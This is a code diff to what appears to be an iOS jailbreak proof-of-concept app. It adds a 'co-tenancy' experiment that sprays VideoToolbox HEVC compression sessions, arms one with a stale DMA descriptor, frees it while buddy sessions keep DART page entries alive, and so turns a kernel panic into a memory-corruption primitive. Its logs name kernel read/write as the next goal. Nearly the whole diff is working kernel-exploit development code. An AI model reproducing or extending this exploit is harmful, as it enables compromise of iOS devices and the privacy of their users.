@@ -3257,6 +3257,11 @@ static void runC2EarlyKill(void) {
 
     exp3Mark(@"C2EK-START");
 
+    // Disable idle timer for soak hygiene
+    dispatch_async(dispatch_get_main_queue(), ^{
+        [UIApplication sharedApplication].idleTimerDisabled = YES;
+    });
+
     NSDateFormatter *fmt = [[NSDateFormatter alloc] init];
     fmt.dateFormat = @"HH:mm:ss.SSS";
 
@@ -4774,6 +4779,14 @@ static void runExp3_ModeA(void) {
     os_log_t eLog = os_log_create("com.research.jbpoc", "exp3");
     exp3Mark(@"START");
 
+    // Disable idle timer for soak hygiene
+    dispatch_async(dispatch_get_main_queue(), ^{
+        [UIApplication sharedApplication].idleTimerDisabled = YES;
+    });
+
+    NSDateFormatter *tsFmt3 = [[NSDateFormatter alloc] init];
+    tsFmt3.dateFormat = @"HH:mm:ss.SSS";
+
     // ---- PHASE 1: BASELINE ----
     exp3Mark(@"P1-baseline-start");
     LOG(@"═══ PHASE 1: BASELINE (clean session output) ═══");
@@ -4926,18 +4939,20 @@ static void runExp3_ModeA(void) {
     VTCompressionSessionRef spraySessions[MAX_SPRAY_SESSIONS];
     int sprayCount = 0;
 
-    // Step 1: thin sprays (320x240, Alpha=255) — same footprint as armed
+    // Step 1: thin sprays (320x240, Alpha=255) — same class as armed
     LOG(@"Creating thin spray sessions (320x240, Alpha=255)...");
     for (int i = 0; i < 20 && sprayCount < MAX_SPRAY_SESSIONS; i++) {
+        NSString *ts = [tsFmt3 stringFromDate:[NSDate date]];
         VTCompressionSessionRef s = exp3CreateSession(
             (void *)exp3CollectCallback, YES);
         if (!s) {
-            LOG(@"Thin spray stopped at %d", i);
+            LOG(@"Thin spray stopped at %d (%@)", i, ts);
             break;
         }
         spraySessions[sprayCount++] = s;
+        exp3Mark([NSString stringWithFormat:@"P4-thin-%d-%@", i, ts]);
         if ((i + 1) % 5 == 0 || i == 0) {
-            INFO(@"Thin spray %d created (total: %d)", i + 1, sprayCount);
+            INFO(@"Thin spray %d at %@ (total: %d)", i + 1, ts, sprayCount);
         }
     }
     int thinCount = sprayCount;
@@ -4946,14 +4961,16 @@ static void runExp3_ModeA(void) {
     // Step 2: fat sprays (1920x1080) — larger PTE footprint per session
     LOG(@"Creating fat spray sessions (1920x1080, no Alpha)...");
     for (int i = 0; sprayCount < MAX_SPRAY_SESSIONS; i++) {
+        NSString *ts = [tsFmt3 stringFromDate:[NSDate date]];
         VTCompressionSessionRef s = exp3CreateSessionEx(
             (void *)exp3CollectCallback, 1920, 1080, NO);
         if (!s) {
-            LOG(@"Fat spray stopped at %d", i);
+            LOG(@"Fat spray stopped at %d (%@)", i, ts);
             break;
         }
         spraySessions[sprayCount++] = s;
-        INFO(@"Fat spray %d created (total: %d)", i + 1, sprayCount);
+        exp3Mark([NSString stringWithFormat:@"P4-fat-%d-%@", i, ts]);
+        INFO(@"Fat spray %d at %@ (total: %d)", i + 1, ts, sprayCount);
     }
     int fatCount = sprayCount - thinCount;
     exp3Mark([NSString stringWithFormat:@"P4-fat=%d total=%d", fatCount, sprayCount]);
@@ -5054,8 +5071,265 @@ static void runExp3_ModeA(void) {
 
     exp3FreeSamples();
 
+    // Re-enable idle timer
+    dispatch_async(dispatch_get_main_queue(), ^{
+        [UIApplication sharedApplication].idleTimerDisabled = NO;
+    });
+
     PASS(@"Exp 3.0 Mode A3 complete.");
     exp3Mark(@"COMPLETE");
+    g_exp3Running = NO;
+}
+
+// ============================================================
+// Mode A4: CO-TENANCY — buddy session keeps PTE alive
+// ============================================================
+//
+// Key insight from A3 failure: DART allocator is bump-forward,
+// so spray-after-free never re-maps the target page. But if we
+// create a "buddy" session BEFORE the arm, they may share the
+// same DART page (sub-page allocation). Then:
+//   1. Create buddy B (same config as arm — 320x240 HEVC Alpha=255)
+//   2. Create arm A (identical config)
+//   3. Arm A (EncodeFrame → -17691)
+//   4. Free A ONLY → if B co-tenants the page, PTE stays VALID
+//   5. Fire → DMA write lands in B's chunk: NO PANIC = corruption
+//
+// If this works: panic→corruption primitive conversion.
+// If still panics at 0x20b: page-granular allocation confirmed.
+//
+// Soak hygiene: disable idle timer, log timestamps for every
+// session create/free, measure fire latency in awake seconds.
+// ============================================================
+
+#define A4_BUDDY_COUNT     10
+#define A4_SOAK_SECS      300
+#define A4_POST_SOAK_SECS 120
+
+static void runExp4_CoTenancy(void) {
+    if (g_exp3Running) {
+        INFO(@"Experiment already running");
+        return;
+    }
+    g_exp3Running = YES;
+
+    pocLog(@"");
+    pocLog(@"╔═══════════════════════════════════════════╗");
+    pocLog(@"║  MODE A4: CO-TENANCY EXPERIMENT            ║");
+    pocLog(@"║  Buddy sessions keep PTE valid after free  ║");
+    pocLog(@"║  *** MAY CAUSE KERNEL PANIC ***            ║");
+    pocLog(@"╚═══════════════════════════════════════════╝");
+    pocLog(@"");
+
+    os_log_t aLog = os_log_create("com.research.jbpoc", "a4");
+    exp3Mark(@"A4-START");
+
+    // Disable idle timer for soak hygiene
+    dispatch_async(dispatch_get_main_queue(), ^{
+        [UIApplication sharedApplication].idleTimerDisabled = YES;
+    });
+
+    NSDateFormatter *tsFmt = [[NSDateFormatter alloc] init];
+    tsFmt.dateFormat = @"HH:mm:ss.SSS";
+
+    // ---- PHASE 1: CREATE BUDDY SESSIONS (before arm) ----
+    exp3Mark(@"A4-P1-buddies-start");
+    LOG(@"═══ A4 PHASE 1: CREATE BUDDIES (same class as arm) ═══");
+    LOG(@"Creating %d buddy sessions (320x240 HEVC Alpha=255)...", A4_BUDDY_COUNT);
+    LOG(@"These allocate BEFORE the arm session in the DART bump.");
+    LOG(@"If sub-page granular, a buddy may share the arm's page.");
+
+    VTCompressionSessionRef buddies[A4_BUDDY_COUNT];
+    int buddyCount = 0;
+    for (int i = 0; i < A4_BUDDY_COUNT; i++) {
+        NSString *ts = [tsFmt stringFromDate:[NSDate date]];
+        VTCompressionSessionRef s = exp3CreateSession(
+            (void *)exp3CollectCallback, YES);
+        if (!s) {
+            LOG(@"Buddy %d failed at %@", i, ts);
+            break;
+        }
+        buddies[buddyCount++] = s;
+        exp3Mark([NSString stringWithFormat:@"A4-buddy-%d-created-%@", i, ts]);
+        LOG(@"  Buddy %d created at %@", i, ts);
+    }
+    PASS(@"Created %d buddy sessions (all 320x240 Alpha=255)", buddyCount);
+    os_log(aLog, "A4 PHASE1 buddies=%d", buddyCount);
+
+    if (buddyCount == 0) {
+        FAIL(@"No buddies created — cannot proceed");
+        g_exp3Running = NO;
+        return;
+    }
+
+    // ---- PHASE 2: ARM (identical config, created AFTER buddies) ----
+    exp3Mark(@"A4-P2-arm-start");
+    LOG(@"");
+    LOG(@"═══ A4 PHASE 2: ARM (AlphaLayerID=255) ═══");
+    LOG(@"Session created AFTER buddies — bump allocator places it");
+    LOG(@"adjacent to buddies in DART DVA space.");
+
+    g_exp3Armed = NO;
+    g_exp3EncodeStatus = 0;
+
+    NSString *armCreateTS = [tsFmt stringFromDate:[NSDate date]];
+    VTCompressionSessionRef armSession = exp3CreateSession(
+        (void *)exp3ArmCallback, YES);
+    if (!armSession) {
+        FAIL(@"Could not create arm session");
+        for (int i = 0; i < buddyCount; i++) {
+            VTCompressionSessionInvalidate(buddies[i]);
+            CFRelease(buddies[i]);
+        }
+        g_exp3Running = NO;
+        return;
+    }
+    exp3Mark([NSString stringWithFormat:@"A4-arm-session-created-%@", armCreateTS]);
+    PASS(@"Arm session created at %@ (after %d buddies)", armCreateTS, buddyCount);
+
+    CVPixelBufferRef armPB = exp3CreatePixelBuffer(0x80, 0x80);
+    if (!armPB) {
+        FAIL(@"Arm pixel buffer failed");
+        VTCompressionSessionInvalidate(armSession);
+        CFRelease(armSession);
+        for (int i = 0; i < buddyCount; i++) {
+            VTCompressionSessionInvalidate(buddies[i]);
+            CFRelease(buddies[i]);
+        }
+        g_exp3Running = NO;
+        return;
+    }
+
+    CMTime armPTS = CMTimeMake(0, 30);
+    OSStatus encStatus = VTCompressionSessionEncodeFrame(armSession, armPB,
+        armPTS, kCMTimeInvalid, NULL, NULL, NULL);
+    INFO(@"Arm EncodeFrame submitted: %d", (int)encStatus);
+
+    VTCompressionSessionCompleteFrames(armSession, kCMTimeInvalid);
+    [NSThread sleepForTimeInterval:2.0];
+
+    if (!g_exp3Armed) {
+        FAIL(@"Arm not detected (status %d)", g_exp3EncodeStatus);
+        VTCompressionSessionInvalidate(armSession);
+        CFRelease(armSession);
+        CVPixelBufferRelease(armPB);
+        for (int i = 0; i < buddyCount; i++) {
+            VTCompressionSessionInvalidate(buddies[i]);
+            CFRelease(buddies[i]);
+        }
+        exp3Mark(@"A4-arm-FAILED");
+        g_exp3Running = NO;
+        return;
+    }
+    exp3Mark(@"A4-P2-armed");
+    PASS(@"Armed — -17691 confirmed. Stale DMA descriptor loaded.");
+
+    // ---- PHASE 3: FREE ARM ONLY (buddies stay alive) ----
+    exp3Mark(@"A4-P3-free-arm-only");
+    LOG(@"");
+    LOG(@"═══ A4 PHASE 3: FREE ARM SESSION ONLY ═══");
+    LOG(@"*** CRITICAL: %d buddy sessions stay ALIVE ***", buddyCount);
+    LOG(@"If a buddy co-tenants the arm's DART page,");
+    LOG(@"the PTE stays valid. Stale DMA writes into buddy's chunk.");
+    LOG(@"No panic = corruption primitive achieved!");
+
+    NSDate *freeTime = [NSDate date];
+    NSString *freeTS = [tsFmt stringFromDate:freeTime];
+    VTCompressionSessionInvalidate(armSession);
+    CFRelease(armSession);
+    armSession = NULL;
+    CVPixelBufferRelease(armPB);
+    armPB = NULL;
+
+    [NSThread sleepForTimeInterval:0.5];
+    PASS(@"Arm session freed at %@. %d buddies still alive.", freeTS, buddyCount);
+    exp3Mark([NSString stringWithFormat:@"A4-arm-freed-%@", freeTS]);
+    os_log(aLog, "A4 PHASE3 arm_freed buddies_alive=%d", buddyCount);
+
+    // ---- PHASE 4: SOAK (fire with buddies holding PTEs) ----
+    exp3Mark(@"A4-P4-soak-start");
+    LOG(@"");
+    LOG(@"═══ A4 PHASE 4: SOAK (%ds) ═══", A4_SOAK_SECS);
+    LOG(@"Fire expected at ~T+156 from arm/teardown.");
+    LOG(@"Buddies hold adjacent DART PTEs.");
+    LOG(@"*** ORACLE: survive T+%d → buddy absorbed stale write ***", A4_SOAK_SECS);
+    LOG(@"***         panic at ~T+156 → page-granular, no sharing ***");
+
+    int elapsed0 = (int)[[NSDate date] timeIntervalSinceDate:freeTime];
+    int soakRemain = A4_SOAK_SECS - elapsed0;
+    if (soakRemain < 60) soakRemain = 60;
+
+    for (int sec = 0; sec < soakRemain; sec += 5) {
+        [NSThread sleepForTimeInterval:5.0];
+        int elapsed = (int)[[NSDate date] timeIntervalSinceDate:freeTime];
+        NSString *ts = [tsFmt stringFromDate:[NSDate date]];
+        INFO(@"T+%03ds: alive (%d buddies) %@", elapsed, buddyCount, ts);
+        if (sec % 30 == 0) {
+            exp3Mark([NSString stringWithFormat:@"A4-soak-T+%d-%@", elapsed, ts]);
+        }
+    }
+
+    PASS(@"*** A4 SOAK SURVIVED T+%d — buddy may have absorbed write ***", A4_SOAK_SECS);
+    os_log(aLog, "A4 PHASE4 SOAK_SURVIVED buddies=%d", buddyCount);
+    exp3Mark(@"A4-SOAK-SURVIVED");
+
+    // ---- PHASE 5: TEARDOWN BUDDIES + POST-SOAK ----
+    exp3Mark(@"A4-P5-teardown-buddies");
+    LOG(@"");
+    LOG(@"═══ A4 PHASE 5: TEARDOWN BUDDIES + POST-SOAK ═══");
+    LOG(@"If buddy absorbed the write, tearing down now frees the");
+    LOG(@"corrupted page. Wait %ds to confirm no further fires.", A4_POST_SOAK_SECS);
+
+    for (int i = 0; i < buddyCount; i++) {
+        NSString *ts = [tsFmt stringFromDate:[NSDate date]];
+        VTCompressionSessionInvalidate(buddies[i]);
+        CFRelease(buddies[i]);
+        exp3Mark([NSString stringWithFormat:@"A4-buddy-%d-freed-%@", i, ts]);
+    }
+    int teardownT = (int)[[NSDate date] timeIntervalSinceDate:freeTime];
+    PASS(@"All buddies freed at T+%d", teardownT);
+
+    for (int sec = 0; sec < A4_POST_SOAK_SECS; sec += 10) {
+        [NSThread sleepForTimeInterval:10.0];
+        int elapsed = (int)[[NSDate date] timeIntervalSinceDate:freeTime];
+        INFO(@"T+%03ds: alive post-teardown", elapsed);
+    }
+
+    PASS(@"*** A4 POST-SOAK SURVIVED — single fire, buddy absorbed ***");
+    exp3Mark(@"A4-POST-SOAK-SURVIVED");
+
+    // ---- RESULTS ----
+    pocLog(@"");
+    LOG(@"═══════════════════════════════════════════════");
+    PASS(@"*** MODE A4: FULL SURVIVAL — CORRUPTION PRIMITIVE ***");
+    LOG(@"Co-tenancy confirmed: buddy session kept PTE valid.");
+    LOG(@"Stale DMA wrote into buddy's chunk without panic.");
+    LOG(@"PANIC → CORRUPTION primitive conversion achieved.");
+    pocLog(@"");
+    LOG(@"Next: scan buddy output buffers for corruption,");
+    LOG(@"vary buddy count to control which offset catches the write,");
+    LOG(@"shape the write for kernel R/W.");
+    LOG(@"═══════════════════════════════════════════════");
+
+    NSString *resultStr = [NSString stringWithFormat:
+        @"A4 CO-TENANCY — FULL SURVIVAL\n"
+        @"Date: %@\nBuddies: %d\n"
+        @"Soak: SURVIVED (%ds)\nPost-soak: SURVIVED (%ds)\n",
+        [NSDate date], buddyCount, A4_SOAK_SECS, A4_POST_SOAK_SECS];
+    NSString *resultPath = [NSHomeDirectory()
+        stringByAppendingPathComponent:@"Documents/a4_result.txt"];
+    [resultStr writeToFile:resultPath atomically:YES
+                  encoding:NSUTF8StringEncoding error:nil];
+
+    exp3FreeSamples();
+
+    // Re-enable idle timer
+    dispatch_async(dispatch_get_main_queue(), ^{
+        [UIApplication sharedApplication].idleTimerDisabled = NO;
+    });
+
+    PASS(@"Mode A4 co-tenancy complete.");
+    exp3Mark(@"A4-COMPLETE");
     g_exp3Running = NO;
 }
 
@@ -5637,20 +5911,33 @@ static void runTier2Probe(void) {
     [dPrep2Btn addTarget:self action:@selector(runDPrep2) forControlEvents:UIControlEventTouchUpInside];
     [self.view addSubview:dPrep2Btn];
 
-    // Experiment 3.0: Mode A Re-claim — row 10 (full width, gold)
+    // Experiment row 10: A3 spray + A4 co-tenancy (two buttons)
     CGFloat row10 = row9 + btnH + gap;
+    CGFloat expBtnW = (w - pad * 2 - gap) / 2;
 
     UIButton *exp3Btn = [UIButton buttonWithType:UIButtonTypeSystem];
-    exp3Btn.frame = CGRectMake(pad, row10, w - pad * 2, btnH);
+    exp3Btn.frame = CGRectMake(pad, row10, expBtnW, btnH);
     exp3Btn.backgroundColor = [UIColor colorWithRed:0.4 green:0.3 blue:0.0 alpha:1];
     exp3Btn.layer.cornerRadius = 8;
     exp3Btn.layer.borderWidth = 2;
     exp3Btn.layer.borderColor = [UIColor colorWithRed:1.0 green:0.8 blue:0.0 alpha:1].CGColor;
-    exp3Btn.titleLabel.font = [UIFont boldSystemFontOfSize:13];
-    [exp3Btn setTitle:@"Exp 3.0: Mode A3 PTE Spray" forState:UIControlStateNormal];
+    exp3Btn.titleLabel.font = [UIFont boldSystemFontOfSize:11];
+    [exp3Btn setTitle:@"A3: PTE Spray" forState:UIControlStateNormal];
     [exp3Btn setTitleColor:[UIColor colorWithRed:1.0 green:0.8 blue:0.0 alpha:1] forState:UIControlStateNormal];
     [exp3Btn addTarget:self action:@selector(runExp3) forControlEvents:UIControlEventTouchUpInside];
     [self.view addSubview:exp3Btn];
+
+    UIButton *a4Btn = [UIButton buttonWithType:UIButtonTypeSystem];
+    a4Btn.frame = CGRectMake(pad + expBtnW + gap, row10, expBtnW, btnH);
+    a4Btn.backgroundColor = [UIColor colorWithRed:0.5 green:0.0 blue:0.3 alpha:1];
+    a4Btn.layer.cornerRadius = 8;
+    a4Btn.layer.borderWidth = 2;
+    a4Btn.layer.borderColor = [UIColor colorWithRed:1.0 green:0.2 blue:0.8 alpha:1].CGColor;
+    a4Btn.titleLabel.font = [UIFont boldSystemFontOfSize:11];
+    [a4Btn setTitle:@"A4: Co-Tenant" forState:UIControlStateNormal];
+    [a4Btn setTitleColor:[UIColor colorWithRed:1.0 green:0.2 blue:0.8 alpha:1] forState:UIControlStateNormal];
+    [a4Btn addTarget:self action:@selector(runA4CoTenancy) forControlEvents:UIControlEventTouchUpInside];
+    [self.view addSubview:a4Btn];
 
     CGFloat logTop = row10 + btnH + gap;
     self.logView = [[UITextView alloc] initWithFrame:
@@ -5800,6 +6087,12 @@ static void runTier2Probe(void) {
 - (void)runExp3 {
     dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
         runExp3_ModeA();
+    });
+}
+
+- (void)runA4CoTenancy {
+    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
+        runExp4_CoTenancy();
     });
 }
 
